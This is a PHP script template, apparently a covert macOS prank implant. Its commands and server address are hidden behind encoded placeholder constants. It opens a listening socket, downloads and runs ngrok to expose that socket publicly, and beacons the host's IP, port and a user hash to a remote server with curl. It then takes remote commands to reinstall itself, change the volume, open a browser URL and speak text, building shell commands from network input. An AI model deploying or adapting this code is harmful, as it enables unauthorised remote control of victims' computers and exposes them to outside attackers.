<?php
// Define constants using base 64 encoded strings wrapped in decode function
define('REGEX_VALID_IP_ADDRESS', '{{B64_CONST_REGEX_VALID_IP_ADDRESS}}');
define('REGEX_SIMPLE_STRING', '{{B64_CONST_REGEX_SIMPLE_STRING}}');
define('REGEX_CTL_QUIT', '{{B64_CONST_REGEX_CTL_QUIT}}');
define('REGEX_CTL_UPDATE', '{{B64_CONST_REGEX_CTL_UPDATE}}');
define('REGEX_CTL_RICK_ROLL', '{{B64_CONST_REGEX_CTL_RICK_ROLL}}');
define('REGEX_CTL_VOICES', '{{B64_CONST_REGEX_CTL_VOICES}}');
define('REGEX_CTL_GET_VOICE', '{{B64_CONST_REGEX_CTL_GET_VOICE}}');
define('REGEX_CTL_SET_VOICE', '{{B64_CONST_REGEX_CTL_SET_VOICE}}');
define('REGEX_CTL_VOLUME', '{{B64_CONST_REGEX_CTL_VOLUME}}');
define('PORT_MIN', '{{B64_CONST_PORT_MIN}}');
define('PORT_MAX', '{{B64_CONST_PORT_MAX}}');
define('SS_PORT', '{{B64_CONST_SS_PORT}}');
define('PROMPT', '{{B64_CONST_PROMPT}}');

// Kill existing process if it's already running
if ($pid = process_running($argv[0])) {
    exec("kill $pid");
}

// Load list of available voices from OSX
$voices = load_voice_list();

// Set the current voice to the default (first in voice list, or manually set if list is empty)
$current_voice = count($voices) > 0 ? $voices[0] : '{{B64_STR_DEFAULT_VOICE}}';

// Allow the script to hang around waiting for connections.
set_time_limit(0);

// Turn on implicit output flushing so we see what we're getting as it comes in.
ob_implicit_flush();

// Default ip address and port to run on
$address = '0.0.0.0';
$port = SS_PORT;

// Global variable for tracking options to send to server as GET params
global $opts;

// Format for opts to be sent as GET params
$opts = array(
    '{{B64_OPT_IP}}' => lookup_ip(),
    '{{B64_OPT_PORT}}' => $port,
    '{{B64_OPT_HASH}}' => '{{USER_HASH}}'
);

// Validate check address and port
(preg_match(REGEX_VALID_IP_ADDRESS, $address)) or die();
(is_numeric($port) && $port > PORT_MIN && $port < PORT_MAX) or die();

// Attempt to open socket, die on failure
if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
    die();
}

// Set socket options
socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1);
socket_set_option($sock, SOL_SOCKET, SO_REUSEPORT, 1);

// Bind open socket to the validated address and port
if (socket_bind($sock, $address, $port) === false) {
    socket_shutdown($sock);
    socket_close($sock);
    die();
}

// Listen on socket
if (socket_listen($sock, 5) === false) {
    socket_shutdown($sock);
    socket_close($sock);
    die();
}

$ngrok_url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-darwin-amd64.zip';

$dir = __DIR__;
$ngrok_zip = "$dir/ngrok.zip";
$ngrok_bin = "$dir/ngrok";

function wait_for_it($host, $port, $timeout=10) {
  $connection = @fsockopen($host, $port);

  while(!is_resource($connection)) {
    sleep(1);

    $timeout--;

    if ($timeout <= 0) {
      return false;
    }

    $connection = @fsockopen($host, $port);    
  }

  if (is_resource($connection)) {
    fclose($connection);

    return true;
  }

  return false;
}

if (!file_exists($ngrok_bin)) {
  file_put_contents($ngrok_zip, fopen($ngrok_url, 'r'));

  exec("unzip $ngrok_zip");

  unlink($ngrok_zip);
}

if (file_exists($ngrok_bin)) {
  exec("nohup $ngrok_bin tcp " . SS_PORT . " &> /dev/null &");

  if (wait_for_it('localhost', 4040)) {
    $ngrok_json = file_get_contents('http://localhost:4040/api/tunnels');

    $ngrok_data = json_decode($ngrok_json);

    if (isset($ngrok_data->tunnels) && count($ngrok_data->tunnels) > 0) {
      $tunnel = $ngrok_data->tunnels[0];

      $tcp_url = $tunnel->public_url;

      if (preg_match("/tcps\:\/\/([^\:]+)\:([0-9]+)/", $tcp_url, $matches)) {
        if (count($matches) > 2) {
            $opts['{{B64_OPT_IP}}'] = $matches[1];
            $opts['{{B64_OPT_PORT}}'] = (int)$matches[2];
        }
      }
    }
  }
}

// Execute curl command to hit server and send mail alert that socket is open
exec(build_curl_cmd('m'));

do {
    // Accept communication messages from the open socket
    if (($msgsock = socket_accept($sock)) === false) {
        socket_shutdown($sock);
        socket_close($sock);
        break;
    }

    // First message sent if the welcome message followed by the SS prompt
    $msg = '{{B64_STR_WELCOME_MSG}}' . PROMPT;

    // Send the welcome message and prompt
    socket_write($msgsock, $msg, strlen($msg));

    // Main loop
    do {
        // Initialize msg as an empty string
        $msg = '';

        // Read buffer from client connected to socket
        if (false === ($buf = socket_read($msgsock, 2048, PHP_NORMAL_READ))) {
            break;
        }

        // Skip this command if (when trimmed) evaluates to false
        if (!$buf = trim($buf)) {
            continue;
        }

        // Full trim of the buffer
        $buf = trim(strtolower($buf), ' _-[]()"\'');

        /**
         * All commands are defined in config.inc and loaded as encoded constants in this file
         */

        // Buffer matches the quit command regex, quit
        if (preg_match(REGEX_CTL_QUIT, $buf)) {
            break;
        // Buffer matches the update command, execute the update command (re-install)
        } else if (preg_match(REGEX_CTL_UPDATE, $buf)) {
            exec('{{B64_CMD_UPDATE}}');
            die();
        // Rick roll easteregg command regex max
        } else if (preg_match(REGEX_CTL_RICK_ROLL, $buf)) {
            // Override the volume
            set_volume(7);
            // Open up the Rick Roll youtube video page with default browser
            open_url('{{B64_STR_RICK_ROLL_URL}}');
        // Buffer matches voices command, list all voices
        } else if (preg_match(REGEX_CTL_VOICES, $buf)) {
            foreach ($voices as $voice) {
                $msg .= $voice . "\r\n";
            }
        // Buffer matches get or set voice command
        } else if (preg_match(REGEX_CTL_GET_VOICE, $buf, $arr) || preg_match(REGEX_CTL_SET_VOICE, $buf, $arr)) {
            if (isset($arr[1])) {
                $voice = $arr[1];

                // Verify the voice to change to exists in list of voices and change current voice
                if (in_array($voice, $voices)) {
                    $current_voice = $voice;
                // Otherwise display voice info
                } else {
                    $msg .= '{{B64_STR_VOICE_HELP}}';
                }
            }

            // Append the current voice to the message
            $msg .= '{{B64_STR_CURRENT_VOICE}}' . " $current_voice\r\n";
        // Buffer matches volume control command
        } else if (preg_match(REGEX_CTL_VOLUME, $buf, $arr)) {
            // Validate argument pulled from regex is present and numeric
            if (isset($arr[1]) && is_numeric($arr[1])) {
                // Override volume
                set_volume($arr[1]);
            }
        } else if (preg_match(REGEX_SIMPLE_STRING, $buf)) {
            if (!command_exist($buf)) {
                $cmd = '{{B64_CMD_SAY}}' . " $current_voice '$buf'";
                exec($cmd);
            } else {
                $msg .= '{{B64_STR_CANNOT_SAY}}' . " '$buf', " . '{{B64_STR_COMMAND_EXISTS}}';
            }
        } else {
            $msg .= '{{B64_STR_CANNOT_SAY}}' . " '$buf', " . '{{B64_STR_TOO_COMPLEX}}';
        }

        $msg .= PROMPT;

        socket_write($msgsock, $msg, strlen($msg));
    } while (true);
    socket_close($msgsock);
} while (true);

function command_exist($cmd) {
    $returnVal = shell_exec('{{B64_CMD_WHICH}}' . " $cmd");
    return (empty($returnVal) ? false : true);
}

function lookup_ip() {
    for ($i = 0; $i < 10; $i++) {
        $cmd = '{{B64_CMD_IPCONFIG}}' . ' ' . '{{B64_CMD_GETIFADDR}}' . ' ' . '{{B64_STR_INTERFACE_PREFIX}}' . $i;
        $adr = trim(exec($cmd));

        if (preg_match(REGEX_VALID_IP_ADDRESS, $adr)) {
            return $adr;
        }
    }

    return ('{{B64_STR_DEFAULT_IP}}');
}

function load_voice_list() {
    $voices = array();

    $cmd = '{{B64_CMD_SAY}}' . " '?'";
    $ret = `$cmd`;
    $arr = explode("\n", $ret);

    foreach ($arr as $line) {
        $stuff = explode(' ', $line);

        if (isset($stuff[0])) {
            $voice = strtolower(trim($stuff[0]));

            if ($voice != '') {
                $voices[] = strtolower(trim($stuff[0]));
            }
        }
    }

    return $voices;
}

function process_running($search) {
    $cmd = '{{B64_CMD_PROCESSES}}';
    $processes = `$cmd`;

    $found = false;
    $pattern = '#' . get_current_user() . '\s+(\d+)\s+.*' . preg_quote($search) . '$#';

    foreach (explode("\n", $processes) as $process) {
        $process = trim($process);

        if (preg_match_all($pattern, $process, $matches)) {
            if (isset($matches[1][0])) {
                $pid = $matches[1][0];

                if ($pid != getmypid()) {
                    return $pid;
                }
            }
        }
    }

    return false;
}

function build_curl_cmd($page = 'm') {
    global $opts;

    if (in_array($page, array('m', 'p'))) {
        $url = '{{B64_STR_SERVER_HOST}}' . "{$page}.php?";
        $url .= http_build_query($opts);
        return ('{{B64_CMD_CURL_SILENT}}' . " '$url'");
    }

    return false;
}

function open_url($url) {
    $cmd = '{{B64_CMD_OPEN}}' . ' "'. $url . '"';
    exec($cmd);
}

function set_volume($lvl) {
    if (is_numeric($lvl)) {
        $lvl = (int)$lvl;

        if ($lvl > 9) $lvl = 9;
        if ($lvl < 0) $lvl = 0;

        $cmd = '{{B64_CMD_OSASCRIPT}}' . ' "' . '{{B64_CMD_SET_VOLUME}}' . ' ' . $lvl . '"';
        exec($cmd);
    }
}
